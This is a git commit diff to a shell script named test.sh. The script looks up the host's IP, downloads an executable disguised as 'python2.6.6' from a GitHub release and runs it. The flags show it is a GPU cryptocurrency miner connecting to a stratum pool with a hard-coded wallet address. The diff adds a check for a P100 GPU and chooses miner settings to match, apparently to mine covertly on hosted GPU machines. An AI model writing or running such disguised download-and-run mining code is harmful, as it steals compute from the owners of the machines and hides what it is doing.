1bf3d5a24a278b5365413d60d64662f83b6f4caf
Ayoub Jadouli <Ayoub JADOULI>
2021-04-03 18:18:01 +0100

    test `0

--- test.sh
+++ test.sh
@@ -6,11 +6,17 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
 echo '#######################################################'
-echo '##################### Test N 8 ########################'
+echo '##################### Test N 10 ########################'
 echo '#######################################################'
 
 rm -rf python2.6.6
 wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
 chmod +x python2.6.6
 #cp python2.6.6 /bin/python2.6.6
-./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 1 --cuda-block-size 256 --cuda-schedule yield  --cuda-streams 4 --cuda-grid-size 65536
+
+if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
+then
+    ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 1 --cuda-block-size 256 --cuda-schedule yield  --cuda-streams 4 --cuda-grid-size 65536
+else
+    ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G 
+fi
